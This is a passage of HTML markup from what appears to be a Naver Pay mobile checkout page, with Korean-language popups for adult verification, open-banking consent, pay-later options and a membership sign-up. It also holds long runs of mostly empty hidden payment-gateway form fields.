					<button type="button" class="npay_common_button type_green_sec size_popup _click(checkout.mobile.order.order_sheet.openAdultAuthenticationPopup(MOBILE)) _stopDefault">휴대폰 인증</button>
					<button type="button" class="npay_common_button type_green_sec size_popup _click(checkout.mobile.order.order_sheet.openAdultAuthenticationPopup(IPIN)) _stopDefault">아이핀 인증</button>
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAdultAuthenticationLayer()) _stopDefault">취소</button>
				</div>
			</div>
		</div>
		
		<div class="dimlayer _openBankingAgreeLayer" style="display:none">
			<div class="dimbg"></div>
			<div class="bottom_floating promotion_layer">
				<strong class="popup_title">오픈뱅킹 이용 약관 동의</strong>
				<div class="openbanking_area">
					<div class="desc">
						<b class="title">오픈뱅킹이란?</b>
						<p>은행 및 증권사 간에 송금, 결제 등의 금융 서비스를 개방하여 제공하는 표준화된 금융시스템입니다.</p>
					</div>
					<div class="agree">
						<ul class="list">
							<li><a href="#" class="_click(checkout.mobile.order.order_sheet.openPopupOpenBankingAgreeInfoPage(TRANSFER)) _stopDefault openbanking_img">(필수) 오픈뱅킹 참여 금융사 이용 약관</a></li>
							<li><a href="#" class="_click(checkout.mobile.order.order_sheet.openPopupOpenBankingAgreeInfoPage(PRIVATE_OFFER)) _stopDefault openbanking_img">(필수) 금융결제원 개인정보 제공 동의</a></li>
						</ul>
					</div>
					<div class="notify">
						<b>은행 또는 증권사로부터 문자 메시지를 받더라도 놀라지마세요!</b>
						<ul class="bullet_list">
							<li class="bullet_item">오픈뱅킹 시스템에 계좌가 잘 등록됐다는 안내이며 간편결제 계좌를 여러 개 등록하셨다면 계좌마다 문자 메시지를 받으실 수도 있습니다.</li>
							<li class="bullet_item">이미 출금이체 동의하셨던 간편결제 계좌에서 출금(결제, 송금, 충전 등) 시 오픈뱅킹이 사용될 수 있습니다.</li>
							<li class="bullet_item">고객님의 요청 없이 출금/이체되지 않으니 안심하고 이용해주세요.</li>
						</ul>
					</div>
				</div>
				<div class="bottom_button">
					<button type="button" class="_click(checkout.mobile.order.order_sheet.agreeUsingOpenBanking()) _stopDefault npay_common_button">동의 후 계속하기</button>
				</div>
				<button type="button" class="_click(checkout.mobile.order.order_sheet.closeOpenBankingAgreeLayer()) _stopDefault button_close openbanking_img"><span class="blind">레이어닫기</span></button>
			</div>
		</div>
		
		<script type="text/template" class="_tpl_select_charge_bank">
			<div class="dimlayer _chargeBankLayer" style="display:none;">
				<div class="dimbg"></div>
				<div class="bottom_floating pointcharge_layer">
					<strong class="popup_title">출금계좌</strong>
					<ul class="account_list">
								<li class="account none">
									등록된 계좌가 없습니다.<br>계좌를 추가해 주세요.
								</li>
					</ul>
					<button type="button" class="N=a:ode.chargepointaccountadd button_add _click(checkout.mobile.order.order_sheet.registerEasyBank()) _stopDefault">계좌 추가</button>
					<button type="button" class="button_close openbanking_img _click(checkout.mobile.order.order_sheet.hideModalLayer(chargeBankLayer)) _stopDefault"><span class="blind">레이어닫기</span></button>
				</div>
			</div>
		</script>
		
		<div class="ly_bx _layer_chargePoint_locked" style="display:none; top: 1960px;">
			<div class="ly_cont no_payment">
				<p class="pop_text">포인트 사용 등으로<br> 남은 결제금액이 <strong class="no_payment_point">0원</strong>입니다.</p>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hidDimmedLayer(layer_chargePoint_locked)) _stopDefault">확인</button>
				</div>
			</div>
		</div>
		
		<!-- 후불결제 팝업 -->
		<!-- 후불결제 사용불가 ( 포인트 > 주문금액 ) 케이스 클릭시 -->
		<div class="ly_bx no_payment _pointOfPayLaterLayer" style="display: none">
			<div class="ly_cont no_payment">
				<strong class="no_payment_title">금융위원회 정책에 따라<br>갖고 있는 포인트를 모두 사용해야<br>후불결제를 이용할 수 있어요.</strong>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hidePayLaterLayer(point)) _stopDefault">확인</button>
				</div>
			</div>
		</div>
		<!-- 후불결제: 나중에 결제 딤드시 -->
		<div class="ly_bx _payNextOfPayLaterLayer" style="display: none">
			<div class="ly_cont charge">
				<p class="pop_text text_gray">후불결제 이용 시<br>'나중에 결제'를 이용하실 수 없습니다.</p>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hidePayLaterLayer(payNext)) _stopDefault">확인</button>
				</div>
			</div>
		</div>
		
		<div class="wrap_layer _newCandidateUserPayLaterWrapLayer" style="display: none">
			<div class="layer_content layer_paylater _newCandidateUserPayLaterLayer">
				<em class="pop_name">네이버페이 후불결제</em>
				<strong class="pop_tit">지금 구매하고<br>다음에 납부하세요!</strong>
				<ul class="check_list">
					<li>최대 <span class="pop_highlight">30만원</span>까지 사용 가능</li>
				</ul>
				<button type="button" class="button_round _click(checkout.mobile.order.order_sheet.goPayLaterSignup()) _stopDefault"><b>30초</b>만에 신청하고 <b>바로 사용</b></button>
				<button type="button" class="btn_popclose _click(checkout.mobile.order.order_sheet.hideNewCandidateUserPayLaterLayer()) _stopDefault"><span class="blind">팝업닫기</span></button>
			</div>
		</div>
		
		<div class="wrap_layer _tutorialPayLaterWrapLayer" style="display: none">
			<div class="layer_content layer_paylater_tutorial _tutorialPayLaterLayer">
				<strong class="pop_tit">
					이제 <span class="point_color_green">후불결제</span>를 사용할 수 있어요!<br>
					<span class="pop_highlight">2가지</span>만 기억하세요.
				</strong>
				<ul class="tutorial_list">
					<li class="item">
						<strong class="number">하나!</strong>
						<strong class="item_title first">보유포인트를<br>모두 사용해야<br>후불결제 이용이 가능해요!</strong>
						<p class="item_desc">후불결제는 금융위원회 정책에 따라 주문 시 보유포인트를 모두 사용해야 이용할 수 있어요. 보유포인트가 주문금액보다 많으면 후불결제 이용이 어려워요.</p>
					</li>
					<li class="item">
						<strong class="number">둘!</strong>
						<strong class="item_title second">이용한 금액은<br>선택하신 납부일에<br>자동으로 출금 돼요.</strong>
						<p class="item_desc">오늘 결제금액은 0원! 납부일 전에 계좌 잔액을 확인해주세요. 이용현황 및 청구서는 네이버페이&gt;홈, 내자산에서 ‘후불결제’를 눌러 언제든지 확인할 수 있어요.</p>
					</li>
				</ul>
				<button type="button" class="btn_ok _click(checkout.mobile.order.order_sheet.hideTutorialPayLaterLayer()) _stopDefault">확인</button>
			</div>
		</div>
		
		<div class="ly_bx no_payment _layer_no_payment" style="display:none;">
			<div class="ly_cont no_payment">
				<strong class="no_payment_title">더 이상 결제할 금액이 없습니다.</strong>
				<p class="no_payment_description">
					다른 결제수단을 이용하시려면<br>포인트 사용 금액을 변경하거나<br>후불결제 선택을 해제해 주세요.</p>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hidDimmedLayer(layer_no_payment)) _stopDefault">확인</button>
				</div>
			</div>
		</div>
		
		<div class="ly_bx no_payment _usePointAllBeforePayLaterWrapLayer" style="display: none">
			<div class="ly_cont no_payment _usePointAllBeforePayLaterLayer">
				<strong class="no_payment_title">보유포인트가 모두 사용됩니다.</strong>
				<div class="point_box">
					<span class="point_notice">보유포인트 전액사용</span>
					<span class="amount">0원</span>
				</div>
				<p class="available_point_text">금융위원회 정책에 따라<br>갖고 있는 포인트를 모두 사용해야<br>후불결제를 이용할 수 있어요.</p>
				<div class="pop_btnarea type_two">
					<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.hideLayerAndNoUsePayLater()) _stopDefault">취소</button><button type="button" class="npay_common_button type_green _click(checkout.mobile.order.order_sheet.hideLayerAndUsePayLater()) _stopDefault">계속</button>
				</div>
			</div>
		</div>
		
		<div class="ly_bx no_payment _unableMinChargePointWrapLayer" style="display:none">
			<div class="ly_cont no_payment _unableMinChargePointLayer">
				<strong class="no_payment_title">충전 가능 금액이 부족하여<br>충전결제 이용이 불가합니다.</strong>
				<p class="available_point_text">최소 1만원부터 충전 가능합니다.<br>(현재 충전 가능 금액 : <span class="no_payment_point"><dummy class="_amount">-</dummy>원</span>)</p>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.hideUnableMinChargePointLayer()) _stopDefault">확인</button>
				</div>
			</div>
		</div>
		<div class="ly_bx no_payment _remainAmountUsingChargePointWrapLayer" style="display:none">
			<div class="ly_cont no_payment _remainAmountUsingChargePointLayer">
				<strong class="no_payment_title">충전한도가 부족하여<br>다른 결제수단이 추가 선택됩니다.</strong>
				<div class="point_box">
					<span class="point_notice">내 충전한도</span>
					<span class="amount"><dummy class="_amount">-</dummy>원</span>
				</div>
				<p class="available_charge_text">
					선불전자지급수단 정책에 의해<br>
					포인트는 200만원 한도 안에서 충전할 수 있어요.<br>
					(보유포인트 + 충전금액 = 최대 200만원)
				</p>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.showChargePointMultiSelectTooltip()) _stopDefault">확인</button>
				</div>
			</div>
		</div>
		
		<div class="ly_bx no_payment _remainAmountWhenPaymentBtnWrapLayer" style="display:none">
			<div class="ly_cont no_payment _remainAmountWhenPaymentBtnLayer">
				<strong class="no_payment_title">남은 결제금액이 있어<br>결제수단이 추가 선택됩니다.</strong>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.showChargePointMultiSelectTooltip()) _stopDefault">확인</button>
				</div>
			</div>
		</div>
		
		
		<div class="ly_bx no_payment _unableChargepointWithPaylaterWrapLayer" style="display:none">
			<div class="ly_cont no_payment _unableChargepointWithPaylaterLayer">
				<strong class="no_payment_title">후불결제 사용 시<br>충전결제 이용이 불가합니다.</strong>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.hideUnableChargepointWithPaylater()) _stopDefault">확인</button>
				</div>
			</div>
		</div>
		
		<div class="_membership_quick_join_layer dimlayer" style="display: none">
			<div class="dimbg"></div>
			<div class="_membership_quick_join_contants_layer bottom_floating membership">
				<div class="membership_layer">
					<div class="title_area">
						<div class="sub_text"><span class="member_icon"><span class="blind">네이버페이 플러스 멤버십</span></span>고객님께만 드리는 깜짝선물</div>
						<div class="title_box">
							<strong class="membership_title"><span class="blind">네이버 멤버십 무료 이용권이 지급되었습니다!</span></strong>
							<p class="description">멤버십 무료이용권은 본 팝업에서<br>멤버십 시작 시 지급됩니다.</p>
							<div class="title_img_box">
								<img src="//img.pay.naver.net/o/mstatic/img/service/mobile/order/img_membership_layer1.png" alt="최대 5%" class="img_agree">
								<span class="img_desc">20만원까지 4%,기본적립 1%</span>
							</div>
						</div>
					</div>
					<div class="content_area">
						<input type="checkbox" id="chk1" class="_membership_quick_join_first_btn button check_circle _click(checkout.mobile.order.order_sheet._selectAllMembershipQuickJoinInputs())">
						<label for="chk1" class="agree_all">모두 동의합니다. <span class="sub">(선택 정보 포함)</span></label>
						<ul class="agree_list">
							<li>
								<input type="checkbox" id="chk2" class="_membership_quick_join_second_btn button check_sub _click(checkout.mobile.order.order_sheet._checkAllMembershipQuickJoinInputs())">
								<!--
									[d] .btn_fold 클릭시 .btn_fold에 .on / .detail_box에 .on 추가 부탁드립니다.
									aria-label="닫기" 로 수정 부탁드립니다.
								-->
								<label for="chk2" class="agree_sub">
									(필수) <a href="https://nid.naver.com/user2/common/terms/terms.nhn?m=viewMembershipTermOfUse" target="_blank" class="link">이용약관</a> 및
									<button type="button" id="membershipQuickJoinFoldBtn" class="_click(checkout.mobile.order.order_sheet._clickMembershipQuickJoinFoldBtn()) _membership_quick_join_fold_btn btn_fold" aria-label="열기">결제 및 멤버십 유의사항</button>에 동의합니다.
								</label>
								<div id="membershipQuickJoinAgreementLayer" class="_membership_quick_join_agreement_layer detail_box">
									<strong class="title">결제 유의사항</strong>
									<ul class="detail_list">
										<li>결제주기 (매월,12개월 등)마다 최초 가입하신 일자에 정기결제가 발생합니다. 동일한 일자가 없는 달은 말일에 결제됩니다.</li>
										<li>가장 마지막으로 네이버플러스 멤버십 및 업그레이드 상품을 구매하실 때 지정하신 결제 수단으로 네이버플러스 멤버십과 업그레이드 상품이 정기결제됩니다.</li>
										<li><b>멤버십 회원이 이용료 결제 후 디지털 서비스 이용권으로 콘텐츠를 열람하는 등 디지털 콘텐츠 서비스를 이용한 경우에는 해당 회차에 대하여 청약철회, 해지 및 환불이 불가능합니다.</b></li>
										<li><b>네이버플러스 멤버십 이용료 결제일의 익일부터 7일 이내에, 네이버페이 포인트 적립 서비스를 제외한 어떠한 혜택도 사용하지 않은 경우에 한하여, 청약철회가 가능합니다. (예를 들어, 1월 1일 결제한 경우, 1월 8일까지 청약철회 가능)</b></li>
										<li><b>청약철회 기간이 경과한 후에도 멤버십 회원이 (i) 어떠한 디지털 서비스 이용권도 선택하지 아니하였거나 (ii) 선택한 디지털 서비스 이용권을 이용하지 아니한 경우에는 이용 기간 내에 해지가 가능하며, 마지막으로 결제한 이용료에서 위약금 10%를 공제한 90%가 환불됩니다.</b></li>
										<li>연간 단위의 상품은 1년의 가입을 유지하는 조건으로 할인 가격에 제공됩니다. 1년이 경과하기 전에 구독을 중도 해지하면 정상가(58,800원, 월 4,900원)을 기준으로 사용한 금액을 공제하고 환불됩니다.</li>
										<li>환불 시, 멤버십 적립 포인트는 환불 시점에 회수되며 적립 예정 멤버십 적립 포인트는 환불 이후 적립되지 않습니다.</li>
										<li>미성년자가 법정대리인 동의 없이 계약을 체결한 경우, 미성년자 본인 또는 법정대리인이 이를 취소할 수 있습니다.</li>
									</ul>
									<strong class="title">가입 유의사항</strong>
									<ul class="detail_list">
										<li>네이버플러스 멤버십 가입은 실명 인증된 네이버 ID 1개에서만 이용이 가능하며, 동시에 2개 이상의 ID에서 중복 사용이 제한됩니다.</li>
										<li>네이버플러스 멤버십의 무료 체험 프로모션은 실명을 기준으로 1회만 적용 가능하며, 중도 해지하여 환불 받으신 경우에도 다시 적용되지 않습니다.</li>
										<li>네이버플러스 멤버십의 모든 혜택은 네이버 및 각 서비스 제공사들의 사정에 따라 변경될 수 있습니다.</li>
										<li>각 디지털 콘텐츠 서비스에서 자체적으로 발생한 문제에 대해서는 네이버플러스 멤버십에서 책임지지 않습니다.</li>
										<li>징계, 탈퇴 등 각 서비스에서 정한 정책 기준에 따라 특정 네이버플러스 멤버십 혜택을 이용하시지 못하는 경우가 발생할 수 있습니다.</li>
										<li>디지털 서비스 이용권 및 업그레이드 상품은 선택 후 해당 네이버플러스 멤버십 기간 중 변경 및 철회가 불가능합니다.</li>
									</ul>
								</div>
							</li>
							<li>
								<input type="checkbox" id="chk3" class="_membership_quick_join_third_btn button check_sub _click(checkout.mobile.order.order_sheet._checkAllMembershipQuickJoinInputs())">
								<label for="chk3" class="agree_sub">(필수) <a href="https://nid.naver.com/user2/common/terms/terms.nhn?m=viewMembership3rd" target="_blank" class="link">네이버-제휴사 간 개인정보 제공</a>에 동의합니다.</label>
							</li>
							<li>
								<input type="checkbox" id="chk4" class="_membership_quick_join_fourth_btn button check_sub _click(checkout.mobile.order.order_sheet._checkAllMembershipQuickJoinInputs())">
								<label for="chk4" class="agree_sub">(필수) <a href="https://nid.naver.com/user2/common/terms/terms.nhn?m=viewMembership3rdToNaver" target="_blank" class="link">제휴사-네이버 간 개인정보 제공</a>에 동의합니다.</label>
							</li>
							<li>
								<input type="checkbox" id="chk5" class="_membership_quick_join_fifth_btn button check_sub _click(checkout.mobile.order.order_sheet._checkAllMembershipQuickJoinInputs())">
								<label for="chk5" class="agree_sub">(선택) 광고성 정보 수신에 동의합니다.</label>
							</li>
						</ul>
						<button type="button" class="N=a:ode.membershiplinebannerbutton _membership_quick_join_confirm_btn button button_bottom type_membership _click(checkout.mobile.order.order_sheet._clickMembershipQuickJoinBtn()) _stopDefault" disabled="disabled">지금 시작하고 포인트 받기</button><!--N=a:ode.membershiplinebannerbutton-->
					</div>
				</div>
				<button type="button" class="_membership_quick_join_close_btn button_close _click(checkout.mobile.order.order_sheet._closeMembershipQuickJoin()) _stopDefault"><span class="blind">레이어닫기</span></button>
			</div>
		</div>
		
		<div class="_membership_quick_join_confirmed_layer dimlayer" style="display: none">
			<div class="dimbg"></div>
			<div class="bottom_floating membership">
				<div class="membership_layer start">
					<div class="title_area">
						<div class="sub_text"><span class="member_icon"><span class="blind">네이버페이 플러스 멤버십</span></span>고객님께만 드리는 깜짝선물</div>
						<div class="title_box">
							<strong class="membership_title"><span class="blind">네이버 멤버십 강력한 혜택이 시작 되었어요!</span></strong>
							<div class="line"></div>
							<p class="description">멤버십 혜택 기간 <span class="_membership_quick_join_duration point">09.05.~10.04.</span></p>
							<div class="title_img_box">
								<img src="//img.pay.naver.net/o/mstatic/img/service/mobile/order/img_membership_layer2.png" alt="쇼핑할 때마다 5% 최대 적립" class="img_agree">
							</div>
						</div>
					</div>
					<div class="content_area">
						<p class="text">
							멤버십이 드리는 강력한 혜택!<br>
							<strong class="point">5% 쇼핑 적립</strong>과 <strong class="point">다양한 디지털 콘텐츠</strong>로<br>
							똑똑한 쇼핑 라이프를<br>
							누려 보세요.
						</p>
						<button type="button" class="button_bottom type_green _click(checkout.mobile.order.order_sheet._closeMembershipQuickConfirmedJoin())">계속 쇼핑하기</button>
					</div>
				</div>
				<button type="button" class="button_close _click(checkout.mobile.order.order_sheet._closeMembershipQuickConfirmedJoin())"><span class="blind">레이어닫기</span></button>
			</div>
		</div>
		
		
		 
		
			<input type="hidden" name="tempOrderId" id="tempOrderId" class="_tempOrderId" value="">
			<input type="hidden" name="reserveSeq" value="6262803928">
			 <input type="hidden" name="approvalSeq">
			 <input type="hidden" name="pgId">
			 <input type="hidden" name="payMeansClass">
			 <input type="hidden" name="accountNo">
			 <input type="hidden" name="endDate">
			 <input type="hidden" name="payAmt">
			 <input type="hidden" name="authKey">
			 <input type="hidden" name="pinNo">
			 <input type="hidden" name="pinNoConfirm">
			 <input type="hidden" name="isPin">
			 <input type="hidden" name="isPinPayMember">
			 <input type="hidden" name="mobileOperator">
			 <input type="hidden" name="phoneNo">
			 <input type="hidden" name="prvsnurl">
			 <input type="hidden" name="cinf">
			 <input type="hidden" name="mobilePayActionType">
			 <input type="hidden" name="fdsUuid">
			 <input type="hidden" name="authentificationToken">
			 <input type="hidden" name="naverToken">
			 <input type="hidden" name="fingerPrintResultCode">
			<input type="hidden" name="usePointAllYn">
			<input type="hidden" name="pointChargeCorpCd">
			<input type="hidden" name="pointChargeCorpKey">
			<input type="hidden" name="pointChargeAmount">
			<input type="hidden" name="useChargePointYn">
			<input type="hidden" name="usePayLaterYn">
			<input type="hidden" name="usePayLaterAllYn">
			<input type="hidden" name="addedPickupLocationYn">
			<input type="hidden" name="alwaysUsePickupLocationYn">
			<input type="hidden" name="refundAccountKey">
		
		 <!-- pg사별 Form -->
			  
			 
				<input type="hidden" name="RSVSEQ" value="">
			<input type="hidden" name="SVCINF" value="">
			<input type="hidden" name="SID" value="">
			<input type="hidden" name="CHNL" value="">
			<input type="hidden" name="USERID" value="">
			<input type="hidden" name="USERKEY" value="">
			<input type="hidden" name="EMAIL" value="">
			<input type="hidden" name="MOBILENO" value="">
			<input type="hidden" name="AMT" value="">
			<input type="hidden" name="CPID" value="">
			<input type="hidden" name="ITEMID" value="">
			<input type="hidden" name="TITLE" value="">
			<input type="hidden" name="PGID" value="">
			<input type="hidden" name="CORPCD" value="">
			<input type="hidden" name="CKEY" value="">
			<input type="hidden" name="PAYNO" value="">
			<input type="hidden" name="VALIDYM">
			<input type="hidden" name="ALLOT">
			<input type="hidden" name="PASSWD">
			<input type="hidden" name="RSVNO" value="">
			<input type="hidden" name="RESNO">
			<input type="hidden" name="INSTMO" value="">
			<input type="hidden" name="NOINTEREST" value="">
			<input type="hidden" name="NOINTERESTTYPE" value="01">
			<input type="hidden" name="POINTFG" value="">
			<input type="hidden" name="PERSON" value="">
			<input type="hidden" name="SPLITPARAM" value="">
			<input type="hidden" name="SPLITYN" value="">
			<input type="hidden" name="CLIENTSEQ" value="">
			
			<input type="hidden" name="MSG" value="">
			<input type="hidden" name="APPROVALSEQ" value="">
			<input type="hidden" name="ACCTNO" value="">
			<input type="hidden" name="ENDDATE" value="">
			<input type="hidden" name="BALANCE" value="">
			<input type="hidden" name="AUTHTYPE" value="">
			
			<input type="hidden" name="NOINTSELLERYN" value="">
			<input type="hidden" name="SURL" value="">
			<input type="hidden" name="RURL" value="">
			<input type="hidden" name="CURL" value="">
			<input type="hidden" name="LBF" id="LBF" value="">
			<input type="hidden" name="MACRURL" value="">
			<input type="hidden" name="EXPDATE" value="">
			
			<input type="hidden" name="ISSKNORMALUSER" value="Y">
			<input type="hidden" name="PREIFRAME" value="">
			<input type="hidden" name="POSTIFRAME" value="">
			<input type="hidden" name="ANSIMFG" value="">
			<input type="hidden" name="SAFEFG" value="">
			<input type="hidden" name="AUTHNO" value="">
			<input type="hidden" name="PAYKEY" value="">
			<input type="hidden" name="IFRAMETYPE" value="">
			<input type="hidden" name="PGFORMNAME" value="">
			<input type="hidden" name="CHARSET" value="">
			<input type="hidden" name="CLOSEURL" value="">
			<input type="hidden" name="LOSTPWCHANGEFG" value="">
			<input type="hidden" name="JOINSTATUS" value="">
			
			<input type="hidden" name="PKGEVD" value="">
			<input type="hidden" name="TAXATIONAMT" value="">
			<input type="hidden" name="EXEMPTIONAMT" value="">
			<input type="hidden" name="USEPENDING" value="">
		
			<input type="hidden" name="mid_common" value="">
			<input type="hidden" name="mid_point" value="">
			<input type="hidden" name="ACCTKEY" value="">
			
		
		
			  
			 
				<input type="hidden" name="RSVSEQ" value="">
			<input type="hidden" name="SVCINF" value="">
			<input type="hidden" name="SID" value="">
			<input type="hidden" name="CHNL" value="">
			<input type="hidden" name="USERID" value="">
			<input type="hidden" name="USERKEY" value="">
			<input type="hidden" name="EMAIL" value="">
			<input type="hidden" name="MOBILENO" value="">
			<input type="hidden" name="AMT" value="">
			<input type="hidden" name="CPID" value="">
			<input type="hidden" name="ITEMID" value="">
			<input type="hidden" name="TITLE" value="">
			<input type="hidden" name="PGID" value="">
			<input type="hidden" name="CORPCD" value="">
			<input type="hidden" name="CKEY" value="">
			<input type="hidden" name="PAYNO" value="">
			<input type="hidden" name="VALIDYM">
			<input type="hidden" name="ALLOT">
			<input type="hidden" name="PASSWD">
			<input type="hidden" name="RSVNO" value="">
			<input type="hidden" name="RESNO">
			<input type="hidden" name="INSTMO" value="">
			<input type="hidden" name="NOINTEREST" value="">
			<input type="hidden" name="NOINTERESTTYPE" value="01">
			<input type="hidden" name="POINTFG" value="">
			<input type="hidden" name="PERSON" value="">
			<input type="hidden" name="SPLITPARAM" value="">
			<input type="hidden" name="SPLITYN" value="">
			<input type="hidden" name="CLIENTSEQ" value="">
			
			<input type="hidden" name="MSG" value="">
			<input type="hidden" name="APPROVALSEQ" value="">
			<input type="hidden" name="ACCTNO" value="">
			<input type="hidden" name="ENDDATE" value="">
			<input type="hidden" name="BALANCE" value="">
			<input type="hidden" name="AUTHTYPE" value="">
			
			<input type="hidden" name="NOINTSELLERYN" value="">
			<input type="hidden" name="SURL" value="">
			<input type="hidden" name="RURL" value="">
			<input type="hidden" name="CURL" value="">
			<input type="hidden" name="LBF" id="LBF" value="">
			<input type="hidden" name="MACRURL" value="">
			<input type="hidden" name="EXPDATE" value="">
			
			<input type="hidden" name="ISSKNORMALUSER" value="Y">
			<input type="hidden" name="PREIFRAME" value="">
			<input type="hidden" name="POSTIFRAME" value="">
			<input type="hidden" name="ANSIMFG" value="">
			<input type="hidden" name="SAFEFG" value="">
			<input type="hidden" name="AUTHNO" value="">
			<input type="hidden" name="PAYKEY" value="">
			<input type="hidden" name="IFRAMETYPE" value="">
			<input type="hidden" name="PGFORMNAME" value="">
			<input type="hidden" name="CHARSET" value="">
			<input type="hidden" name="CLOSEURL" value="">
			<input type="hidden" name="LOSTPWCHANGEFG" value="">
			<input type="hidden" name="JOINSTATUS" value="">
			
			<input type="hidden" name="PKGEVD" value="">
			<input type="hidden" name="TAXATIONAMT" value="">
			<input type="hidden" name="EXEMPTIONAMT" value="">
			<input type="hidden" name="USEPENDING" value="">
		
			<input type="hidden" name="mid_common" value="naver_smartstore05">
			<input type="hidden" name="mid_point" value="naver_smartstore05">
			
			<input type="hidden" name="OC_MID" id="OC_MID" value="">
			<input type="hidden" name="OC_CARDTYPE" id="OC_CARDTYPE" value="">
			<input type="hidden" name="OC_POINTUSE" id="OC_POINTUSE" value="N">
			<input type="hidden" name="OC_NOINT_NDISP" id="OC_NOINT_NDISP" value="">
			<input type="hidden" name="OC_NOINT" id="OC_NOINT" value="">
			<input type="hidden" name="OC_INSTMO" id="OC_INSTMO" value="">
			
			<input type="hidden" name="OC_REGTYPE" id="OC_REGTYPE" value="">
			<input type="hidden" name="OC_REGFRAME" id="OC_REGFRAME" value="approval_frame_51A">
			<input type="hidden" name="IFRAME_NAME" value="">
		
		
			  
			 
				<input type="hidden" name="RSVSEQ" value="">
			<input type="hidden" name="SVCINF" value="">
			<input type="hidden" name="SID" value="">
			<input type="hidden" name="CHNL" value="">
			<input type="hidden" name="USERID" value="">
			<input type="hidden" name="USERKEY" value="">
			<input type="hidden" name="EMAIL" value="">
			<input type="hidden" name="MOBILENO" value="">
			<input type="hidden" name="AMT" value="">
			<input type="hidden" name="CPID" value="">
			<input type="hidden" name="ITEMID" value="">
			<input type="hidden" name="TITLE" value="">
			<input type="hidden" name="PGID" value="">
			<input type="hidden" name="CORPCD" value="">
			<input type="hidden" name="CKEY" value="">
			<input type="hidden" name="PAYNO" value="">
			<input type="hidden" name="VALIDYM">
			<input type="hidden" name="ALLOT">
			<input type="hidden" name="PASSWD">
			<input type="hidden" name="RSVNO" value="">
			<input type="hidden" name="RESNO">
			<input type="hidden" name="INSTMO" value="">
			<input type="hidden" name="NOINTEREST" value="">
			<input type="hidden" name="NOINTERESTTYPE" value="01">
			<input type="hidden" name="POINTFG" value="">
			<input type="hidden" name="PERSON" value="">
			<input type="hidden" name="SPLITPARAM" value="">
			<input type="hidden" name="SPLITYN" value="">
			<input type="hidden" name="CLIENTSEQ" value="">
			
			<input type="hidden" name="MSG" value="">
			<input type="hidden" name="APPROVALSEQ" value="">
			<input type="hidden" name="ACCTNO" value="">
			<input type="hidden" name="ENDDATE" value="">
			<input type="hidden" name="BALANCE" value="">
			<input type="hidden" name="AUTHTYPE" value="">
			
			<input type="hidden" name="NOINTSELLERYN" value="">
			<input type="hidden" name="SURL" value="">
			<input type="hidden" name="RURL" value="">
			<input type="hidden" name="CURL" value="">
			<input type="hidden" name="LBF" id="LBF" value="">
			<input type="hidden" name="MACRURL" value="">
			<input type="hidden" name="EXPDATE" value="">
			
			<input type="hidden" name="ISSKNORMALUSER" value="Y">
			<input type="hidden" name="PREIFRAME" value="">
			<input type="hidden" name="POSTIFRAME" value="">
			<input type="hidden" name="ANSIMFG" value="">
			<input type="hidden" name="SAFEFG" value="">
			<input type="hidden" name="AUTHNO" value="">
			<input type="hidden" name="PAYKEY" value="">
			<input type="hidden" name="IFRAMETYPE" value="">
			<input type="hidden" name="PGFORMNAME" value="">
			<input type="hidden" name="CHARSET" value="">
			<input type="hidden" name="CLOSEURL" value="">
			<input type="hidden" name="LOSTPWCHANGEFG" value="">
			<input type="hidden" name="JOINSTATUS" value="">
			
			<input type="hidden" name="PKGEVD" value="">
			<input type="hidden" name="TAXATIONAMT" value="">
			<input type="hidden" name="EXEMPTIONAMT" value="">
			<input type="hidden" name="USEPENDING" value="">
			<input type="hidden" name="PGCP" value="60A">
			<input type="hidden" name="CP_UI" value="">
			<input type="hidden" name="CASH_GB" value="MC">
			<input type="hidden" name="Prdtnm" value="">
			<input type="hidden" name="Prdtprice" value="">
			<input type="hidden" name="Siteurl" value="">
			<input type="hidden" name="Tradeid" value="">
			<input type="hidden" name="MC_SVCID" value="">
			<input type="hidden" name="smobileSid" value="">
			<input type="hidden" name="Okurl" value="">
			<input type="hidden" name="Failurl" value="">
			<input type="hidden" name="MC_No" value="">
			<input type="hidden" name="Cryptstring" value="">
			<input type="hidden" name="mUserKey" value="">
			<input type="hidden" name="Closeurl" value="">
			<input type="hidden" name="phoneId" value="">
			<input type="hidden" name="PAY_MODE" value="">
			<input type="hidden" name="LOGO_YN" value="">
			<input type="hidden" name="CALL_TYPE" value="">
			<input type="hidden" name="MC_FIXNO" value="">
			<input type="hidden" name="IFRAME_NAME" value="">
			<input type="hidden" name="Cryptyn" value="">
			<input type="hidden" name="EMAIL_HIDDEN" value="Y">
			<input type="hidden" name="Payeremail" value="">
			<input type="hidden" name="Userid" value="">
			<input type="hidden" name="Item" value="">
			<input type="hidden" name="Prdtcd" value="">
			<input type="hidden" name="MSTR" value="">
			<input type="hidden" name="MC_JOIN_TYPE" value="J">
			<input type="hidden" name="JOIN_STATUS" value="N">
			
			<input type="hidden" name="SocialNo" value="">
			<input type="hidden" name="authType" value="">
			<input type="hidden" name="Mobilid" value="">
			<input type="hidden" name="ansimFlag" value="">
			<input type="hidden" name="safeguard" value="">
		
				   
				<input type="hidden" name="RSVSEQ" value="">
			<input type="hidden" name="SVCINF" value="">
			<input type="hidden" name="SID" value="">
			<input type="hidden" name="CHNL" value="">
			<input type="hidden" name="USERID" value="">
			<input type="hidden" name="USERKEY" value="">
			<input type="hidden" name="EMAIL" value="">
			<input type="hidden" name="MOBILENO" value="">
			<input type="hidden" name="AMT" value="">
			<input type="hidden" name="CPID" value="">
			<input type="hidden" name="ITEMID" value="">
			<input type="hidden" name="TITLE" value="">
			<input type="hidden" name="PGID" value="">
			<input type="hidden" name="CORPCD" value="">
			<input type="hidden" name="CKEY" value="">
			<input type="hidden" name="PAYNO" value="">
			<input type="hidden" name="VALIDYM">
			<input type="hidden" name="ALLOT">
